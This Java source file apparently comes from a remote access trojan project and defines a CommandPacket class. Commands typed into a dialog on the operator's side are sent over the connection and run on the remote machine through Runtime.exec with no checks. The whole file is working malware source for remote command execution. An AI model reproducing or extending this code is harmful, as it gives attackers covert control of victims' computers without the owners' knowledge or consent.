package de.sogomn.rat.packet;

import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveConnection;

public final class CommandPacket implements IPacket {
	
	private String command;
	
	public CommandPacket(final String command) {
		this.command = command;
	}
	
	public CommandPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection client) {
		client.writeUTF(command);
	}
	
	public void receive(final ActiveConnection client) {
		command = client.readUTF();
	}
	
	public void execute(final ActiveConnection client) {
		try {
			Runtime.getRuntime().exec(command);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static CommandPacket create() {
		final String input = JOptionPane.showInputDialog(null);
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		} else {
			return null;
		}
	}
	
}
